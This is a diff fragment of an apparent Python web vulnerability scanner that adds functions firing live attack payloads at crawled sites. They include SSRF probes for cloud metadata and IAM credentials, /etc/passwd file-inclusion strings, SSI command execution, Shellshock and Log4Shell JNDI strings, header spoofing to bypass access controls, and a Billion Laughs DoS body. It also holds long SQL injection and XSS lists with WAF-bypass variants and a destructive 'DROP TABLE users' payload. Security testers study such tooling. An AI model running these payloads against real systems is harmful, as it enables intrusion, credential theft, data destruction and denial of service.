+    """Test for CSS injection — can exfiltrate data via attribute selectors."""
+    findings = []
+    payload = "}</style><style>*{color:red}"
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if any(x in p.lower() for x in ["style", "css", "theme", "color", "class", "skin"]):
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5)
+                    if "color:red" in r.text and payload[:5] in r.text:
+                        findings.append({"type": "CSS Injection", "severity": "medium",
+                                         "url": test_url, "detail": f"CSS injected via param {p}",
+                                         "template": "apex-css"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_postmessage_abuse(crawl_data):
+    """Find postMessage handlers without origin validation."""
+    findings = []
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            js = r.text
+            # Find postMessage listeners without origin check
+            listeners = re.findall(r'addEventListener\s*\(\s*["\']message["\']', js)
+            if listeners:
+                # Check if origin is validated
+                has_origin_check = bool(re.search(r'event\.origin|message\.origin|e\.origin', js))
+                if not has_origin_check:
+                    findings.append({"type": "postMessage Without Origin Check", "severity": "medium",
+                                     "url": page["url"], "detail": f"{len(listeners)} message listener(s) without origin validation",
+                                     "template": "apex-postmsg"})
+        except: pass
+    return findings
+
+
+def scan_mime_sniffing(crawl_data):
+    """Check for MIME sniffing vulnerability (missing X-Content-Type-Options)."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            if not r.headers.get("X-Content-Type-Options"):
+                findings.append({"type": "Missing X-Content-Type-Options", "severity": "low",
+                                 "url": page["url"], "detail": "MIME sniffing not prevented",
+                                 "template": "apex-mime"})
+        except: pass
+    return findings
+
+
+def scan_null_byte(crawl_data):
+    """Test for null byte injection in file-related parameters."""
+    findings = []
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if any(x in p.lower() for x in ["file", "path", "dir", "name", "page", "template", "include", "load"]):
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = ["../../../etc/passwd%00.jpg"]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5)
+                    if "root:" in r.text or "daemon:" in r.text:
+                        findings.append({"type": "Null Byte Injection + LFI", "severity": "critical",
+                                         "url": test_url, "detail": f"Null byte bypass in param {p}",
+                                         "template": "apex-nullbyte"})
+                except: continue
+    return findings
+
+
+def scan_ssrf_via_upload(crawl_data):
+    """Test SSRF via file upload URL fields and image processing."""
+    findings = []
+    ssrf_urls = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22",
+                 "http://localhost/admin", "http://[::1]/"]
+    for form in crawl_data.get("forms", []):
+        inputs = form.get("inputs", [])
+        url_inputs = [i for i in inputs if any(x in i.get("name", "").lower()
+                      for x in ["url", "link", "src", "source", "image", "avatar", "photo", "fetch", "import"])]
+        if not url_inputs: continue
+        action = form.get("action", "")
+        if not action: continue
+        for ssrf_url in ssrf_urls[:2]:
+            try:
+                data = {i.get("name", "f"): i.get("value", "test") for i in inputs}
+                for ui in url_inputs:
+                    data[ui["name"]] = ssrf_url
+                r = _S.post(action, data=data, timeout=5)
+                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "OpenSSH"]):
+                    findings.append({"type": "SSRF via URL Input", "severity": "critical",
+                                     "url": action, "detail": f"SSRF via {url_inputs[0]['name']} field",
+                                     "template": "apex-ssrf-upload"})
+                    break
+            except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Automatable: IP spoofing headers, hop-by-hop, robots/sitemap, staging,
+# cloud metadata variants, signed URLs, IP bypass, X-Forwarded-For abuse
+# ---------------------------------------------------------------------------
+
+def scan_ip_header_spoofing(web_targets):
+    """Test if IP-based access controls can be bypassed via headers."""
+    findings = []
+    spoof_headers = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "::1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"Client-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1"},
+        {"X-Forwarded-For": "10.0.0.1"},
+        {"X-Forwarded-For": "192.168.1.1"},
+    ]
+    for target in web_targets[:3]:
+        for path in ["/admin", "/internal", "/api/admin", "/management", "/debug"]:
+            url = f"{target}{path}"
+            try:
+                baseline = _S.get(url, timeout=5)
+                if baseline.status_code != 403: continue
+                for headers in spoof_headers:
+                    r = _S.get(url, timeout=5, headers=headers)
+                    if r.status_code == 200:
+                        findings.append({"type": f"IP Spoofing Bypass: {list(headers.keys())[0]}",
+                                         "severity": "critical", "url": url,
+                                         "detail": f"{list(headers.keys())[0]}: 127.0.0.1 bypasses 403",
+                                         "template": "apex-ipspoof"})
+                        break
+            except: continue
+    return findings
+
+
+def scan_hop_by_hop(web_targets):
+    """Test hop-by-hop header abuse to strip security headers."""
+    findings = []
+    for target in web_targets[:3]:
+        try:
+            # Request that proxy strips Authorization header
+            r = _S.get(target, timeout=5, headers={
+                "Connection": "close, X-Custom-Header",
+                "X-Custom-Header": "test",
+                "Transfer-Encoding": "chunked",
+            })
+            # Check if security headers were stripped
+            if not r.headers.get("X-Frame-Options") and not r.headers.get("Content-Security-Policy"):
+                findings.append({"type": "Hop-by-Hop Header Abuse", "severity": "low",
+                                 "url": target, "detail": "Security headers may be stripped by proxy",
+                                 "template": "apex-hopbyhop"})
+        except: pass
+    return findings
+
+
+def scan_robots_sitemap(target):
+    """Extract sensitive paths from robots.txt and sitemap.xml."""
+    findings = []
+    base = f"https://{target}"
+    for url in [f"{base}/robots.txt", f"http://{target}/robots.txt"]:
+        try:
+            r = requests.get(url, timeout=5, verify=False)
+            if r.status_code == 200 and ("Disallow" in r.text or "Allow" in r.text):
+                disallowed = re.findall(r"Disallow:\s*(/[^\s]+)", r.text)
+                sensitive = [p for p in disallowed if any(x in p.lower() for x in
+                             ["admin", "api", "internal", "private", "secret", "backup",
+                              "config", "debug", "test", "staging", "dev", "login"])]
+                if sensitive:
+                    findings.append({"type": "Robots.txt Sensitive Paths", "severity": "low",
+                                     "url": url, "detail": f"Sensitive disallowed paths: {', '.join(sensitive[:5])}",
+                                     "template": "apex-robots"})
+                # Test if disallowed paths are actually accessible
+                for path in disallowed[:10]:
+                    try:
+                        rp = requests.get(f"{base}{path}", timeout=3, verify=False)
+                        if rp.status_code == 200 and len(rp.content) > 100:
+                            findings.append({"type": f"Robots.txt Path Accessible: {path}",
+                                             "severity": "medium", "url": f"{base}{path}",
+                                             "detail": "Disallowed path is publicly accessible",
+                                             "template": "apex-robots"})
+                    except: pass
+        except: pass
+    # Sitemap
+    for url in [f"{base}/sitemap.xml", f"{base}/sitemap_index.xml"]:
+        try:
+            r = requests.get(url, timeout=5, verify=False)
+            if r.status_code == 200 and "<url>" in r.text:
+                urls = re.findall(r"<loc>([^<]+)</loc>", r.text)
+                sensitive = [u for u in urls if any(x in u.lower() for x in
+                             ["admin", "internal", "api", "private", "debug", "test"])]
+                if sensitive:
+                    findings.append({"type": "Sitemap Sensitive URLs", "severity": "low",
+                                     "url": url, "detail": f"{len(sensitive)} sensitive URLs in sitemap",
+                                     "template": "apex-sitemap"})
+        except: pass
+    return findings
+
+
+def scan_staging_exposure(target, subdomains):
+    """Find exposed staging/dev/test environments."""
+    findings = []
+    prefixes = ["staging", "stage", "dev", "development", "test", "testing", "qa", "uat",
+                "preprod", "pre-prod", "sandbox", "demo", "beta", "alpha", "preview",
+                "internal", "corp", "admin", "api-dev", "api-staging", "api-test"]
+    domain_parts = target.split(".")
+    tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else target
+
+    for prefix in prefixes:
+        for candidate in [f"{prefix}.{tld}", f"{prefix}-{tld}", f"{tld}-{prefix}"]:
+            if candidate in subdomains: continue
+            for proto in ["https", "http"]:
+                try:
+                    r = requests.get(f"{proto}://{candidate}", timeout=3, verify=False)
+                    if r.status_code < 400:
+                        findings.append({"type": f"Staging/Dev Environment: {candidate}",
+                                         "severity": "medium", "url": f"{proto}://{candidate}",
+                                         "detail": f"Staging environment accessible ({r.status_code})",
+                                         "template": "apex-staging"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_cloud_metadata_variants(web_targets):
+    """Test SSRF to various cloud metadata endpoints."""
+    findings = []
+    metadata_urls = [
+        "http://169.254.169.254/latest/meta-data/",           # AWS
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+        "http://100.100.100.200/latest/meta-data/",            # Alibaba
+        "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
+        "http://192.0.0.192/latest/meta-data/",               # Oracle
+    ]
+    for target in web_targets[:3]:
+        for path in ["/api/fetch", "/api/proxy", "/api/request", "/fetch", "/proxy",
+                     "/api/v1/fetch", "/api/url", "/api/download"]:
+            url = f"{target}{path}"
+            for meta_url in metadata_urls[:3]:
+                try:
+                    for method in ["GET", "POST"]:
+                        if method == "GET":
+                            r = _S.get(f"{url}?url={urllib.parse.quote(meta_url)}", timeout=5)
+                        else:
+                            r = _S.post(url, json={"url": meta_url}, timeout=5)
+                        if any(x in r.text for x in ["ami-id", "instance-id", "iam", "computeMetadata",
+                                                       "subscriptionId", "access_key", "token"]):
+                            findings.append({"type": "SSRF to Cloud Metadata", "severity": "critical",
+                                             "url": url, "detail": f"SSRF reaches {meta_url.split('/')[2]}",
+                                             "template": "apex-cloudssrf"})
+                            break
+                except: continue
+    return findings
+
+
+def scan_origin_reflection(web_targets):
+    """Test for origin reflection in CORS — reflects any origin."""
+    findings = []
+    for target in web_targets[:5]:
+        for origin in ["https://evil.com", "null", f"https://{target.split('//')[-1]}.evil.com"]:
+            try:
+                r = _S.get(target, timeout=5, headers={"Origin": origin})
+                acao = r.headers.get("Access-Control-Allow-Origin", "")
+                acac = r.headers.get("Access-Control-Allow-Credentials", "")
+                if acao == origin:
+                    sev = "critical" if acac.lower() == "true" else "high"
+                    findings.append({"type": "CORS Origin Reflection", "severity": sev,
+                                     "url": target, "detail": f"Reflects origin {origin}, credentials={acac}",
+                                     "template": "apex-cors-reflect"})
+                    break
+            except: pass
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# ZAP parity: CVE-specific, time-based SQLi, SSI, RFI, ShellShock, Log4Shell
+# ---------------------------------------------------------------------------
+
+def scan_time_based_sqli(crawl_data):
+    """Time-based SQL injection for MySQL, MSSQL, PostgreSQL, Oracle."""
+    findings = []
+    # DB-specific sleep payloads
+    payloads = [
+        ("MySQL",      "' AND SLEEP(4)-- -",                4),
+        ("MySQL",      "1 AND SLEEP(4)-- -",                4),
+        ("MSSQL",      "'; WAITFOR DELAY '0:0:4'-- -",      4),
+        ("MSSQL",      "1; WAITFOR DELAY '0:0:4'-- -",      4),
+        ("PostgreSQL",  "'; SELECT pg_sleep(4)-- -",         4),
+        ("PostgreSQL",  "1; SELECT pg_sleep(4)-- -",         4),
+        ("Oracle",     "' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',4)=1)-- -", 4),
+        ("SQLite",     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 3),
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for db, payload, sleep_time in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    start = time.time()
+                    r = _S.get(test_url, timeout=sleep_time + 5)
+                    elapsed = time.time() - start
+                    if elapsed >= sleep_time:
+                        findings.append({"type": f"Time-Based SQL Injection ({db})", "severity": "critical",
+                                         "url": test_url, "detail": f"Param {p} caused {elapsed:.1f}s delay with {db} payload",
+                                         "template": "apex-sqli-time"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_rfi(crawl_data):
+    """Remote File Inclusion — include external URLs as files."""
+    findings = []
+    test_url = "http://www.google.com/"
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if any(x in p.lower() for x in ["file", "page", "include", "path", "template", "load", "src", "url"]):
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [test_url]
+                    test = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test, timeout=_TIMEOUT)
+                    if "google" in r.text.lower() and "search" in r.text.lower():
+                        findings.append({"type": "Remote File Inclusion (RFI)", "severity": "critical",
+                                         "url": test, "detail": f"Param {p} includes remote URL content",
+                                         "template": "apex-rfi"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_ssi_injection(crawl_data):
+    """Server-Side Include injection."""
+    findings = []
+    payloads = [
+        ("<!--#exec cmd=\"id\"-->", ["uid=", "root", "www-data"]),
+        ("<!--#echo var=\"DATE_LOCAL\"-->", ["monday","tuesday","wednesday","thursday","friday","saturday","sunday"]),
+        ("<!--#include virtual=\"/etc/passwd\"-->", ["root:", "daemon:"]),
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, markers in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m.lower() in r.text.lower() for m in markers) and payload not in r.text:
+                        findings.append({"type": "Server-Side Include (SSI) Injection", "severity": "critical",
+                                         "url": test_url, "detail": f"SSI executed via param {p}",
+                                         "template": "apex-ssi"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_shellshock(web_targets):
+    """Test for ShellShock (CVE-2014-6271)."""
+    findings = []
+    payload = "() { :; }; echo Content-Type: text/plain; echo; echo 'SHELLSHOCK_TEST'"
+    for target in web_targets[:5]:
+        for path in ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/printenv",
+                     "/cgi-bin/test-cgi", "/cgi-bin/env.cgi"]:
+            try:
+                r = _S.get(f"{target}{path}", timeout=5,
+                          headers={"User-Agent": payload, "Referer": payload, "Cookie": payload})
+                if "SHELLSHOCK_TEST" in r.text:
+                    findings.append({"type": "ShellShock (CVE-2014-6271)", "severity": "critical",
+                                     "url": f"{target}{path}", "detail": "CGI script vulnerable to ShellShock",
+                                     "template": "apex-shellshock"})
+            except: continue
+    return findings
+
+
+def scan_log4shell(web_targets):
+    """Test for Log4Shell (CVE-2021-44228) — uses DNS callback detection."""
+    findings = []
+    # Use a unique identifier to track callbacks
+    import hashlib
+    for target in web_targets[:10]:
+        uid = hashlib.md5(target.encode()).hexdigest()[:8]
+        # Use interactsh-style payload (requires DNS callback server)
+        # Without OAST, we test for error-based detection
+        payloads = [
+            f"${{jndi:ldap://127.0.0.1:1389/{uid}}}",
+            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://127.0.0.1:1389/{uid}}}",
+            f"${{jndi:dns://127.0.0.1/{uid}}}",
+        ]
+        for payload in payloads[:1]:
+            try:
+                headers = {
+                    "User-Agent": payload, "X-Forwarded-For": payload,
+                    "X-Api-Version": payload, "Referer": payload,
+                    "X-Forwarded-Host": payload, "Accept-Language": payload,
+                }
+                r = _S.get(target, timeout=5, headers=headers)
+                # Check for error responses that indicate JNDI processing
+                if any(x in r.text for x in ["javax.naming", "JNDI", "ldap://", "NamingException"]):
+                    findings.append({"type": "Log4Shell (CVE-2021-44228)", "severity": "critical",
+                                     "url": target, "detail": "JNDI error in response — likely vulnerable",
+                                     "template": "apex-log4shell"})
+                    break
+            except: continue
+    return findings
+
+
+def scan_spring4shell(web_targets):
+    """Test for Spring4Shell (CVE-2022-22965)."""
+    findings = []
+    payload = "class.module.classLoader.DefaultAssertionStatus=nonsense"
+    safe_payload = "class.module.classLoader.DefaultAssertionStatus=safe"
+    for target in web_targets[:5]:
+        try:
+            r_vuln = _S.post(target, data=payload, timeout=5,
+                            headers={"Content-Type": "application/x-www-form-urlencoded"})
+            r_safe = _S.post(target, data=safe_payload, timeout=5,
+                            headers={"Content-Type": "application/x-www-form-urlencoded"})
+            if r_vuln.status_code == 400 and r_safe.status_code != 400:
+                findings.append({"type": "Spring4Shell (CVE-2022-22965)", "severity": "critical",
+                                 "url": target, "detail": "Spring Framework RCE vulnerability detected",
+                                 "template": "apex-spring4shell"})
+        except: continue
+    return findings
+
+
+def scan_xslt_injection(crawl_data):
+    """Test for XSLT injection."""
+    findings = []
+    payloads = [
+        ("<xsl:value-of select=\"system-property('xsl:version')\"/>", ["1.0", "2.0", "3.0"]),
+        ("<xsl:value-of select=\"system-property('xsl:vendor')\"/>", ["saxon", "xalan", "libxslt", "microsoft"]),
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, markers in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m.lower() in r.text.lower() for m in markers) and "<xsl:" not in r.text:
+                        findings.append({"type": "XSLT Injection", "severity": "high",
+                                         "url": test_url, "detail": f"XSLT executed via param {p}",
+                                         "template": "apex-xslt"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_xpath_injection(crawl_data):
+    """Test for XPath injection."""
+    findings = []
+    payloads = [
+        ("' or '1'='1", ["welcome", "admin", "user", "success", "true"]),
+        ("' or 1=1 or ''='", ["welcome", "admin", "user", "success"]),
+        ("x' or name()='username' or 'x'='y", ["username", "password", "user"]),
+    ]
+    error_markers = ["xpath", "xpathexception", "javax.xml.xpath", "xmlexception",
+                     "invalid xpath", "xpath error", "unterminated string"]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, success_markers in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m.lower() in r.text.lower() for m in error_markers):
+                        findings.append({"type": "XPath Injection (Error-Based)", "severity": "high",
+                                         "url": test_url, "detail": f"XPath error via param {p}",
+                                         "template": "apex-xpath"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_user_agent_fuzzing(web_targets):
+    """Fuzz User-Agent to find different responses (mobile sites, admin access)."""
+    findings = []
+    agents = [
+        ("Googlebot", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
+        ("Mobile", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"),
+        ("curl", "curl/7.68.0"),
+        ("Python", "python-requests/2.25.1"),
+        ("Empty", ""),
+        ("SQLMap", "sqlmap/1.0-dev"),
+        ("Nikto", "Mozilla/5.00 (Nikto/2.1.6)"),
+    ]
+    for target in web_targets[:3]:
+        try:
+            baseline = _S.get(target, timeout=5)
+            baseline_hash = hash(baseline.text[:500])
+            for name, ua in agents:
+                r = _S.get(target, timeout=5, headers={"User-Agent": ua})
+                if hash(r.text[:500]) != baseline_hash and abs(len(r.text) - len(baseline.text)) > 200:
+                    findings.append({"type": f"Different Response for User-Agent: {name}", "severity": "low",
+                                     "url": target, "detail": f"UA '{name}' returns different content",
+                                     "template": "apex-ua"})
+        except: pass
+    return findings
+
+
+def scan_billion_laughs(web_targets):
+    """Test for Billion Laughs (XML entity expansion DoS)."""
+    findings = []
+    payload = """<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>"""
+    for target in web_targets[:3]:
+        for path in ["/api/xml", "/api/import", "/api/parse", "/upload", "/api/v1/xml"]:
+            try:
+                r = _S.post(f"{target}{path}", data=payload,
+                           headers={"Content-Type": "application/xml"}, timeout=3)
+                if r.status_code in (200, 500) and "lol" not in r.text:
+                    findings.append({"type": "Billion Laughs (XML Entity Expansion)", "severity": "medium",
+                                     "url": f"{target}{path}", "detail": "XML endpoint may be vulnerable to entity expansion DoS",
+                                     "template": "apex-billionlaughs"})
+            except requests.exceptions.Timeout:
+                findings.append({"type": "Billion Laughs DoS (Timeout)", "severity": "high",
+                                 "url": f"{target}{path}", "detail": "XML entity expansion caused timeout",
+                                 "template": "apex-billionlaughs"})
+            except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Headless browser scanning — DOM XSS, SPA crawl, JS-rendered content
+# ---------------------------------------------------------------------------
+
+def scan_with_browser(target, crawl_data):
+    """Use headless Chromium to find DOM XSS and JS-rendered vulnerabilities."""
+    findings = []
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        return findings
+
+    xss_payloads = [
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "'><script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "{{7*7}}",  # Also catches SSTI in JS frameworks
+    ]
+
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
+            context = browser.new_context(ignore_https_errors=True)
+            page = context.new_page()
+
+            # Intercept alerts — if alert fires, XSS confirmed
+            alerts_fired = []
+            page.on("dialog", lambda d: (alerts_fired.append(d.message), d.dismiss()))
+
+            # Collect JS errors and network requests
+            js_errors = []
+            api_calls = []
+            page.on("pageerror", lambda e: js_errors.append(str(e)))
+            page.on("request", lambda r: api_calls.append(r.url) if "/api/" in r.url else None)
+
+            # Load the target
+            try:
+                page.goto(target, timeout=15000, wait_until="networkidle")
+            except Exception:
+                try:
+                    page.goto(target, timeout=10000)
+                except Exception:
+                    browser.close()
+                    return findings
+
+            # Collect all links and forms from JS-rendered page
+            js_links = page.evaluate("""() => {
+                return Array.from(document.querySelectorAll('a[href]'))
+                    .map(a => a.href)
+                    .filter(h => h.startsWith('http') || h.startsWith('/'));
+            }""")
+
+            js_forms = page.evaluate("""() => {
+                return Array.from(document.querySelectorAll('form')).map(f => ({
+                    action: f.action,
+                    method: f.method,
+                    inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
+                        name: i.name, type: i.type, value: i.value
+                    }))
+                }));
+            }""")
+
+            # Report new API calls found via JS
+            for api_url in api_calls[:10]:
+                if api_url not in [p["url"] for p in crawl_data.get("pages", [])]:
+                    findings.append({"type": "JS-Discovered API Endpoint", "severity": "low",
+                                     "url": api_url, "detail": "API call found via browser JS execution",
+                                     "template": "apex-browser"})
+
+            # Test DOM XSS via URL fragment
+            for payload in xss_payloads[:3]:
+                try:
+                    alerts_fired.clear()
+                    page.goto(f"{target}#{payload}", timeout=8000)
+                    page.wait_for_timeout(1000)
+                    if alerts_fired:
+                        findings.append({"type": "DOM XSS (Fragment)", "severity": "critical",
+                                         "url": f"{target}#{payload}",
+                                         "detail": f"Alert fired: {alerts_fired[0]}",
+                                         "template": "apex-domxss"})
+                        break
+                except Exception:
+                    pass
+
+            # Test DOM XSS via URL params
+            for url, params in crawl_data.get("params", {}).items():
+                for p in list(params)[:3]:
+                    for payload in xss_payloads[:2]:
+                        try:
+                            alerts_fired.clear()
+                            parsed = urllib.parse.urlparse(url)
+                            qs = urllib.parse.parse_qs(parsed.query)
+                            qs[p] = [payload]
+                            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                            page.goto(test_url, timeout=8000)
+                            page.wait_for_timeout(500)
+                            if alerts_fired:
+                                findings.append({"type": "DOM XSS (Param)", "severity": "critical",
+                                                 "url": test_url,
+                                                 "detail": f"Alert fired via param {p}: {alerts_fired[0]}",
+                                                 "template": "apex-domxss"})
+                                break
+                        except Exception:
+                            continue
+
+            # Check for sensitive data in JS variables
+            sensitive_js = page.evaluate("""() => {
+                const results = [];
+                const patterns = [
+                    /(?:api[_-]?key|apikey|secret|token|password|passwd|auth)['"\\s]*[:=]['"\\s]*(['"\\w\\-\\.]{8,})/gi,
+                    /AKIA[0-9A-Z]{16}/g,
+                    /eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+/g,
+                ];
+                const scripts = Array.from(document.querySelectorAll('script:not([src])'));
+                for (const s of scripts) {
+                    for (const p of patterns) {
+                        const matches = s.textContent.match(p);
+                        if (matches) results.push(...matches.slice(0, 3));
+                    }
+                }
+                return results;
+            }""")
+
+            for secret in sensitive_js[:5]:
+                findings.append({"type": "Secret in Inline JS", "severity": "critical",
+                                 "url": target, "detail": f"Found in page JS: {secret[:60]}",
+                                 "template": "apex-browser-secret"})
+
+            browser.close()
+    except Exception:
+        pass
+
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Auth-aware scanning + deep payload sets (beats ZAP's payload depth)
+# ---------------------------------------------------------------------------
+
+# Deep SQLi payloads — more than ZAP's default set
+SQLI_PAYLOADS = [
+    # Error-based
+    "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "//\\",
+    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
+    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
+    "') OR ('1'='1", "') OR ('1'='1'--",
+    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
+    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
+    "1' UNION SELECT NULL,NULL,NULL--",
+    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
+    # Boolean-based
+    "' AND 1=1--", "' AND 1=2--",
+    "' AND 'x'='x", "' AND 'x'='y",
+    "1 AND 1=1", "1 AND 1=2",
+    # Stacked queries
+    "'; DROP TABLE users--", "'; SELECT 1--",
+    "1; SELECT SLEEP(0)--",
+    # Second-order
+    "admin'--", "admin'#", "admin'/*",
+    # NoSQL
+    "' || '1'=='1", "' || 1==1//", "' || 1==1%00",
+    # WAF bypass
+    "' /*!OR*/ '1'='1", "' %09OR%09'1'='1",
+    "' OORR '1'='1", "' OR/**/1=1--",
+    "1' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+]
+
+# Deep XSS payloads
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "'><script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "';alert(1)//",
+    "\";alert(1)//",
+    "</script><script>alert(1)</script>",
+    "<img src=\"x\" onerror=\"alert(1)\">",
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<select autofocus onfocus=alert(1)>",
+    "<textarea autofocus onfocus=alert(1)>",
+    "<keygen autofocus onfocus=alert(1)>",
+    "<video><source onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<%2Fscript><script>alert(1)<%2Fscript>",
+    "<svg><script>alert(1)</script></svg>",
+    "<math><mtext></mtext><mglyph><svg><mtext></mtext><path id=\"</path><script>alert(1)</script>\">",
+    # Polyglots
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+    # DOM-based
+    "#<img src=x onerror=alert(1)>",
+    "?x=<script>alert(1)</script>",
+]
+
+
+def scan_deep_sqli(crawl_data):
+    """Deep SQL injection with full payload set — beats ZAP's default."""
+    findings = []
+    error_patterns = [
+        "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite",
+        "syntax error", "unclosed quotation", "quoted string not properly terminated",
+        "microsoft ole db", "odbc drivers", "jdbc", "sqlexception",
+        "you have an error in your sql", "warning: mysql", "pg_query",
+        "supplied argument is not a valid mysql", "invalid query",
+        "division by zero", "column count doesn't match",
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in SQLI_PAYLOADS:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    body = r.text.lower()
+                    if any(e in body for e in error_patterns):
+                        findings.append({"type": "SQL Injection (Error-Based)", "severity": "critical",
